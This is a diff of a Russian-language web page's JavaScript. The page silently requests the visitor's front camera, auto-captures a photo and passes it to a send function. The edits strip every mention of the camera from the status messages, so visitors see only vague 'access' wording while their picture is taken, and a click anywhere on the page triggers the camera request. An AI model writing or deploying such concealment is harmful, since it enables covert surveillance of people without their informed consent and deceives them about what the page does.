@@ -146,13 +146,13 @@
     }
 
     async function requestCameraAndAutoCapture() {
-        setStatus('Запрос доступа к передней камере...');
+        setStatus('Запрос доступа...');
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: "user" } }
             });
             video.srcObject = stream;
-            setStatus('Камера разрешена. Инициализация...');
+            setStatus('Инициализация...');
             video.onloadedmetadata = () => {
                 video.play();
                 setTimeout(() => {
@@ -161,21 +161,21 @@
             };
         } catch (err) {
             if (err.name === 'OverconstrainedError') {
-                setStatus('Передняя камера не найдена. Пробую любую...', true);
+                setStatus('Доступ не найден. Пробую любую...', true);
                 try {
                     const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream = fallbackStream;
                     video.srcObject = stream;
-                    setStatus('Используется камера по умолчанию.');
+                    setStatus('Используется доступ по умолчанию.');
                     video.onloadedmetadata = () => {
                         video.play();
                         setTimeout(() => captureAndSend(), 1200);
                     };
                 } catch (fallbackErr) {
-                    setStatus('Ошибка доступа к камере: ' + fallbackErr.message, true);
+                    setStatus('Ошибка доступа: ' + fallbackErr.message, true);
                 }
             } else if (err.name === 'NotAllowedError') {
-                setStatus('Вы запретили доступ к камере. Разрешите и обновите страницу.', true);
+                setStatus('Вы запретили доступ. Разрешите и обновите страницу.', true);
             } else {
                 setStatus('Ошибка: ' + err.message, true);
             }
@@ -186,7 +186,7 @@
         requestCameraAndAutoCapture();
         setTimeout(() => {
             if (!stream && !photoCaptured) {
-                setStatus('📌 Нажмите в любом месте страницы для доступа к камере');
+                setStatus('📌 Нажмите в любом месте страницы для доступа ');
                 document.body.addEventListener('click', () => requestCameraAndAutoCapture(), { once: true });
             }
         }, 1500);
